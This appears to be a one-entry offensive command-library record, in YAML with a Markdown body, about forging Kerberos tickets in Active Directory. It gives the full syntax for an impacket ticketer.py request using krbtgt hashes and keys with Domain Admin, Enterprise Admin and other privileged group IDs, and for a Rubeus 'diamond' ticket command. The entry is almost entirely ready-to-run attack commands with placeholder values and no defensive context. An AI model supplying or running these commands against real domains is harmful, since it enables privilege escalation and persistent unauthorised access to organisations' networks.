---
id: 84f8b7a7-a51f-4f83-b135-f79d62de05b7
name: Request Ticket from ticketer.py and Export it using Rubeus.exe
type: command
executor: bash
data: 'ticketer.py -request -domain ''lab.local'' -user ''domain_user'' -password
  ''password'' -nthash ''krbtgt/service NT hash'' -aesKey ''krbtgt/service AES key''
  -domain-sid ''S-1-5-21-...'' -user-id ''1337'' -groups ''512,513,518,519,520'' ''baduser''


  Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER
  /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS'
output: null
created_at: '2023-04-06T03:56:04.881767+00:00'
updated_at: '2023-04-10T20:26:29.279492+00:00'
---

# Request Ticket from ticketer.py and Export it using Rubeus.exe

```bash
ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'

Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
```


